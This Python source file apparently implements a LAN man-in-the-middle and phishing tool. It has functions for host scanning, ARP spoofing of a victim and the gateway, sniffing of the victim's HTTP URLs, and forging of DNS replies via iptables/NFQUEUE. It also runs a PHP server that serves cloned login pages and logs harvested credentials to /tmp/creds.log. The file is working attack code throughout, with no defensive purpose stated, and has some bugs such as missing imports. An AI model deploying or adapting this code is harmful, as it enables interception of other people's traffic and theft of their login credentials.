from scapy import *
from nfqueue import *
from subprocess import Popen, PIPE, STDOUT
from shutil import copy
from time import sleep
from socket import socket, AF_INET, gethostbyname
from fcntl import ioctl
from ipaddress import ip_network


def nscan(interface):
    my_ip = get_ip(interface)
    gw_ip = get_gateway(interface)
    p = Popen("ip route | grep %s | grep 'src %s' | awk '{print $1}'" % (interface, my_ip),
              shell=True, stdout=PIPE)
    netid = p.communicate()[0].rstrip()

    # try:
    #     scanner = PortScanner()
    #     scanner.scan(hosts=netid, arguments="-sn")
    #     hosts_list = []
    #     for host in scanner.all_hosts():
    #         if "up" in scanner[host]["status"]["state"] and not host in [my_ip, gw_ip]:
    #             hosts_list.append(host)
    #     return hosts_list
    # except:
    #     return []

    procs = []
    active_hosts = []
    all_hosts = list(ip_network(unicode(netid)).hosts())
    for host in all_hosts:
        procs.append((host, Popen("ping %s -c 1" % host, shell=True, stdout=PIPE)))

    for (host, proc) in procs:
        if proc.poll() is not None:
            if proc.returncode == 0 and str(host) not in [gw_ip, my_ip]:
                active_hosts.append(str(host))
    sleep(.05)
    return active_hosts


def get_ip(interface):
    p = Popen("ip route | grep %s | grep 'src' | awk '{print $9}'" % interface,
              shell=True, stdout=PIPE)
    output = p.communicate()[0].rstrip()
    return output


def get_mac(ip, local=False):
    if ip == "255.255.255.255":
        return "ff:ff:ff:ff:ff:ff"
    if local:
        ping(ip)
        p = Popen("arp -a | grep  '(%s)' | awk  '{print $4}'" % ip, shell=True, stdout=PIPE)
        output = p.communicate()[0].rstrip()
        return output
    else:
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=5, retry=3)
        for snd, rcv in ans:
            return rcv.sprintf("%Ether.src%")


def get_gateway(interface):
    p = Popen("ip route show 0.0.0.0/0 dev %s | awk '{print $3}'" % interface,
              shell=True, stdout=PIPE)
    output = p.communicate()[0].rstrip()
    return output


def valid_ip(s):
    if len(s.split('.')) != 4:
        return False
    for x in s.split('.'):
        if not x.isdigit():
            return False
        if int(x) < 0 or int(x) > 255:
            return False
    return True


def get_if_list():
    f = open("/proc/net/dev", "r")
    lst = []
    f.readline()
    f.readline()
    for l in f:
        lst.append(l.split(":")[0].strip())
    return lst


def get_if_mac(interface):
    s = socket()
    ifreq = ioctl(s, 0x8927, struct.pack("16s16x", interface))
    s.close()
    family, mac = struct.unpack("16xh6s8x", ifreq)
    return ("%02x:"*6)[:-1] % tuple(map(ord, mac))


# def get_dhcp(interface):
#     dhcp = (Ether(dst='ff:ff:ff:ff:ff:ff') /
#             IP(src="0.0.0.0", dst="255.255.255.255") /
#             UDP(sport=68, dport=67) /
#             BOOTP(chaddr=get_if_mac(interface)) /
#             DHCP(options=[("message-type", "discover"),
#                 ("param_req_list",
#                  chr(DHCPRevOptions["router"][0]),
#                  chr(DHCPRevOptions["domain"][0]),
#                  chr(DHCPRevOptions["server_id"][0]),
#                  chr(DHCPRevOptions["name_server"][0]),),
#                 "end"]))
#     ans, unans = srp(dhcp, timeout=6, retry=1)

#     if ans:
#         for s, r in ans:
#             dhcp_opt = r[0][DHCP].options
#             dhcp_ip = r[0][IP].src
#             for opt in dhcp_opt:
#                 if 'domain' in opt:
#                     local_domain = opt[1]
#                     pass
#                 else:
#                     local_domain = 'None'
#                 if 'name_server' in opt:
#                     dns_ip = opt[1]
#     else:
#         dns_ip = get_gateway(interface)
#         dhcp_ip = dns_ip
#         local_domain = 'None'
#     return [dhcp_ip, dns_ip, local_domain]


class URLInspector(object):

    def __init__(self, interface, vic_ip, conn):
        self.interface = interface
        self.vic_ip = vic_ip
        self.conn = conn
        self.past_url = None

    def inspect(self):
        sniff(store=0, filter="port 80 and host %s"
              % self.vic_ip, prn=self.parse, iface=self.interface)

    def parse(self, pkt):
        if pkt.haslayer(Raw) and pkt.haslayer(TCP):
            load = repr(pkt[Raw].load)[1:-1]

            try:
                headers, body = load.split(r"\r\n\r\n", 1)
            except:
                headers = load
            header_lines = headers.split(r"\r\n")

            url = ""
            post = ""
            get = ""
            host = ""

            for l in header_lines:
                if re.search('[Hh]ost: ', l):
                    try:
                        host = l.split('Host: ', 1)[1]
                    except:
                        try:
                            host = l.split('host: ', 1)[1]
                        except:
                            pass
                if re.search('GET /', l):
                    try:
                        get = l.split('GET ')[1].split(' ')[0]
                    except:
                        pass
                if re.search('POST /', l):
                    try:
                        post = l.split(' ')[1].split(' ')[0]
                    except:
                        pass
            if host and post:
                url = host+post
            elif host and get:
                url = host+get

            if url and not "ocsp" in url:
                skip = [".jpg", ".jpeg", ".gif", ".png", ".css", ".ico", ".js", ".svg"]
                if any(i in url for i in skip) or len(url) > 80:
                    pass
                elif not url == self.past_url:
                    self.past_url = url
                    self.conn.send(["url", url])


class WebServer(object):

    def __init__(self, service, conn):
        self.service = service
        self.conn = conn
        credsf = open("/tmp/creds.log", "w+")
        credsf.write("None")
        credsf.close()

    def start(self):
        copy("sites/%s.html" % self.service, "/tmp/index.html")
        copy("sites/%s.php" % self.service, "/tmp/%s.php" % self.service)
        Popen("php -S 0.0.0.0:80 -t /tmp/", shell=True, stdout=PIPE, stderr=STDOUT)
        while True:
            sleep(2)
            with open("/tmp/creds.log", "r") as credsf:
                lines = credsf.readlines()
            self.conn.send(("cred " + lines[-1]).split())

    def stop(self):
        try:
            Popen("killall php", shell=True, stdout=PIPE)
            Popen("rm /tmp/%s.php" % self.service, shell=True, stdout=PIPE)
            Popen("rm /tmp/index.html", shell=True, stdout=PIPE)
        except:
            pass


class Spoofer(object):

    def __init__(self, interface, vic_ip, dst_ip):
        self.interface = interface
        self.vic_ip = vic_ip
        self.dst_ip = dst_ip
        self.dst_mac = get_mac(self.dst_ip)
        self.vic_mac = get_mac(self.vic_ip)

    def arpspoof(self):
        fake_dst = ARP(op=2, hwsrc=get_if_mac(self.interface), psrc=self.vic_ip,
                       pdst=self.dst_ip, hwdst=self.dst_mac)
        fake_vic = ARP(op=2, hwsrc=get_if_mac(self.interface), psrc=self.dst_ip,
                       pdst=self.vic_ip, hwdst=self.vic_mac)

        while True:
            send(fake_vic, count=3)
            send(fake_dst, count=3)
            sniff(filter="arp and (host %s or host %s)" % (self.dst_ip, self.vic_ip),
                  count=1, timeout=1)

    def dnsspoof(self, domain, target, alld, specific=False):
        if valid_ip(target):
            self.target = target
        else:
            self.target = gethostbyname(target)

        if specific:
            self.domain = domain
            self.got_creds = False
        else:
            self.domain = domain.split()

        self.specific = specific
        self.alld = alld
        self.queue = queue()
        self.queue.set_callback(self.reply)
        self.queue.fast_open(0, AF_INET)
        self.queue.set_mode(NFQNL_COPY_PACKET)
        Popen("modprobe nfnetlink_queue", shell=True, stdout=PIPE, stderr=STDOUT)
        Popen("iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 0",
              shell=True, stdout=PIPE, stderr=STDOUT)
        self.queue.try_run()

    def reply(self, payload):
        data = IP(payload.get_data())
        if not data.haslayer(DNSQR):
            payload.set_verdict(NF_ACCEPT)
        else:
            ip = data[IP]
            udp = data[UDP]
            dns = data[DNS]

            reply = (IP(dst=ip.src, src=ip.dst) /
                     UDP(dport=udp.sport, sport=udp.dport) /
                     DNS(id=dns.id, qr=1, aa=1, qd=dns.qd,
                         an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=self.target)))

            if self.specific:
                try:
                    with open("/tmp/creds.log", "r") as credsf:
                        lines = credsf.readlines()
                        if lines[-1] != "None":
                            self.got_creds = True
                except:
                    pass

                target_domains = [self.domain, ("%s." % self.domain), ("www.%s." % self.domain)]
                if dns.qd.qname in target_domains and self.got_creds is False:
                    payload.set_verdict(NF_DROP)
                    send(reply)
            else:
                if any(domain in dns.qd.qname for domain in self.domain) or self.alld:
                    payload.set_verdict(NF_DROP)
                    send(reply)

    def restore(self):
        real_dst = ARP(op=2, pdst=self.vic_ip, psrc=self.dst_ip,
                       hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.dst_mac)
        real_vic = ARP(op=2, pdst=self.dst_ip, psrc=self.vic_ip,
                       hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.vic_mac)

        send(real_vic, count=3)
        send(real_dst, count=3)

    def forward(self, enable=True):
        if enable:
            Popen("sysctl -w net.ipv4.ip_forward=1", shell=True, stdout=PIPE, stderr=STDOUT)
        else:
            Popen("sysctl -w net.ipv4.ip_forward=0", shell=True, stdout=PIPE, stderr=STDOUT)

    def flush(self):
        Popen("iptables -F", shell=True, stdout=PIPE)
        Popen("iptables -t nat -F", shell=True, stdout=PIPE)
        Popen("iptables -X", shell=True, stdout=PIPE)
        Popen("iptables -t nat -X", shell=True, stdout=PIPE)
